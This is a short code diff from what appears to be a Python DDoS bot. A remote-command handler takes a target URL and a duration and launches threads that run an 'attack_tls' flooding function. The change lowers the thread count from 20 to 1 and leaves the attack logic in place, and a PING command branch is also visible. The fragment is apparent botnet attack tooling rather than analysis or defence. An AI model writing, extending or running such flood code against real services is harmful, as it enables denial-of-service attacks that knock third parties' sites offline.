@@ -216,7 +216,7 @@ def main():
                     url = args[1]
                     duration = int(args[2])
                     end_time = time.time() + duration
-                    threads = 20
+                    threads = 1
                     for _ in range(threads):
                         threading.Thread(target=attack_tls, args=(url, end_time), daemon=True).start()
                 elif command == 'PING':
